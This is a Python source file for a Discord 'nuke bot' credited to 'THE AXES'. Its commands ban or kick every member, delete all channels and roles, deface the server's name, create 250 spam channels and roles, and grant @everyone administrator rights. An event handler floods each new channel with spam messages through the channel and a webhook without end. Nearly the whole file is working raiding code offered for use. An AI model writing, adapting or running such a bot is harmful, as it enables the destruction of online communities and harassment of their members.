import os
os.system("pip install discord")
os.system("pip install colorama")
import discord, json
from discord.ext import commands
from colorama import Fore
from discord import Webhook
import datetime, random

with open('config.json') as config:
	setup = json.load(config)
	
token = setup.get('bot_token')
plefix = setup.get('prefix')
namesforchannel = setup.get('channelnames')
namesforroles = setup.get('rolenames')
spam_message = setup.get('spam_text')


intents = discord.Intents.all()
client = commands.Bot(description="Axe Advance Nuke Bot", command_prefix=plefix, intents=intents)
client.remove_command('help')


def axeop():
	os.system('title AXE NUKE BOT V2 && cls' if os.name=='nt' else 'clear')
	print(f"{Fore.LIGHTCYAN_EX} AXE NUKE BOT V2 {Fore.RESET}")

@client.event
async def on_ready():
	await client.change_presence(status=discord.Status.dnd, activity=discord.Game(name="AXES RUNS CORD"))
	axeop()
	print(f"""{Fore.BLUE}
	

███╗░░██╗██╗░░░██╗██╗░░██╗███████╗
████╗░██║██║░░░██║██║░██╔╝██╔════╝
██╔██╗██║██║░░░██║█████═╝░█████╗░░
██║╚████║██║░░░██║██╔═██╗░██╔══╝░░
██║░╚███║╚██████╔╝██║░╚██╗███████╗
╚═╝░░╚══╝░╚═════╝░╚═╝░░╚═╝╚══════╝

██████╗░░█████╗░████████╗
██╔══██╗██╔══██╗╚══██╔══╝
██████╦╝██║░░██║░░░██║░░░
██╔══██╗██║░░██║░░░██║░░░
██████╦╝╚█████╔╝░░░██║░░░
╚═════╝░░╚════╝░░░░╚═╝░░░ {Fore.RESET}
{Fore.LIGHTYELLOW_EX} PREFIX : {plefix}{Fore.RESET}
{Fore.LIGHTRED_EX} MADE BY : THE AXES
{Fore.LIGHTYELLOW_EX} LOGGED IN : {client.user.name}#{client. user.discriminator}""")

def RandomColor():
    randcolor = discord.Color(random.randint(0x000000, 0xFFFFFF))
    return randcolor


@client.command()
async def help(ctx):
	embed=discord.Embed(title="MADE BY : THE AXES", description="[YOUTUBE](https://youtube.com/channel/UCMEhNSLa2O6WQqtqpjwu-sw)")
	embed.set_author(name="ADVANCE NUKE BOT", icon_url="https://media.discordapp.net/attachments/984383210710507590/1001449542404804618/letter-logo-design-simple-modern-logo-design-letter-very-simple-black-background-color-183193944.jpg")
	embed.set_thumbnail(url="https://media.discordapp.net/attachments/984383210710507590/1001911829087391844/download_1.jpeg")
	embed.add_field(name=f"{plefix}help", value="Shows This Page", inline=False)
	embed.add_field(name=f"{plefix}serverinfo", value="Gives Server Info", inline=False)
	embed.add_field(name="All Below Commands Require Administration Permission", value="Keep This In Mind", inline=False)
	embed.add_field(name=f"{plefix}nuke", value="Delete All Channels, Bans All Members, Delete All Roles, create channels and roles, spam all message", inline=False)
	embed.add_field(name=f"{plefix}delchannel", value="Delete All Channels", inline=False)
	embed.add_field(name=f"{plefix}delrole", value="Delete All Roles", inline=False)
	embed.add_field(name=f"{plefix}massban", value="Bans Every Member", inline=False)
	embed.add_field(name=f"{plefix}masskick", value="Kicks Every User", inline=False)
	embed.add_field(name=f"{plefix}adminall", value="Gives Everyone Admin Permission", inline=False)
	embed.add_field(name=f"{plefix}shutdown", value="ShutDown The Bot", inline=False)
	embed.set_footer(text=client.user.name)
	await ctx.send(embed=embed)
	
@client.command()
async def massban(ctx):
    await ctx.message.delete()
    users = list(ctx.guild.members)
    for user in users:
        try:
            await user.ban(reason="Axes Runs Cord")
            print(f"{Fore.LIGHTCYAN_EX}[+][BANNED]{Fore.LIGHTYELLOW_EX} {user.name}{Fore.RESET}")
        except:
            pass


@client.command()
async def masskick(ctx):
    await ctx.message.delete()
    users = list(ctx.guild.members)
    for user in users:
        try:
            await user.kick(reason="Axes Runs Cord")
            print(f"{Fore.LIGHTCYAN_EX}[+][KICKED]{Fore.LIGHTYELLOW_EX} {user.name}{Fore.RESET}")
        except:
            pass

@client.command(aliases=["delchannel"])
async def delchannels(ctx):
    await ctx.message.delete()
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
        except:
            return

@client.command(aliases=["deleteroles"])
async def delroles(ctx):
    await ctx.message.delete()
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except:
            pass
            
            
@client.command()
async def nuke(ctx):
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await user.ban()
        except:
            pass
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
        except:
            pass
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except:
            pass
    try:
        await ctx.guild.edit(
            name="TRASHED BY AXE",
            description="AXES RUNS CORD",
            reason="SEIZED BY THE AXES | Github.com/TheAxes",
            icon=None,
            banner=None
        )
    except:
        pass
    for _i in range(250):
        await ctx.guild.create_text_channel(name=namesforchannel)
    for _i in range(250):
        await ctx.guild.create_role(name=namesforroles, color=RandomColor())
        
        
@client.command()
async def serverinfo(ctx):
    await ctx.message.delete()
    date_format = "%a, %d %b %Y %I:%M %p"
    embed = discord.Embed(title=f"{ctx.guild.name}",
                          description=f"\n {len(ctx.guild.members)} Members\n {len(ctx.guild.roles)} Roles\n {len(ctx.guild.text_channels)} Text-Channels\n {len(ctx.guild.voice_channels)} Voice-Channels\n {len(ctx.guild.categories)} Categories",
                          timestamp=datetime.datetime.utcnow(), color=discord.Color.blue())
    embed.add_field(name="Server created at", value=f"{ctx.guild.created_at.strftime(date_format)}")
    embed.add_field(name="Server Owner", value=f"{ctx.guild.owner}")
    embed.add_field(name="Server Region", value=f"{ctx.guild.region}")
    embed.add_field(name="Server ID", value=f"{ctx.guild.id}")
    embed.set_thumbnail(url=f"{ctx.guild.icon_url}")
    await ctx.send(embed=embed)
   
@client.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send(random.choice(spam_message))


@client.event
async def on_guild_channel_create(channel):
  webhook =await channel.create_webhook(name = "Seized By TheAxes")  
  while True:  
    await channel.send(random.choice(spam_message))
    await webhook.send(random.choice(spam_message), username="AXES RUNS CORD")

permissions = discord.Permissions(8)
@client.command(pass_context=True)
async def adminall(ctx):
	await ctx.message.delete()
	for role in list(ctx.guild.roles):
		if role.name == '@everyone':
			try:
				await role.edit(permissions=permissions, reason="Axe On Top")
				print(f"\x1b[38;5;34mGave everyone Admin In {ctx.guild.name}!") 
			except:
				print(f"\x1b[38;5;196mUnable To Give @everyone Admin In {ctx.guild.name}!")
				
    
@client.command()
async def shutdown(ctx):
	embed = discord.Embed(description="AXE ADVANCE NUKE BOT | SHUT DOWN SUCCESSFULLY")
	await ctx.reply(embed=embed)
	await client.close()



client.run(token)
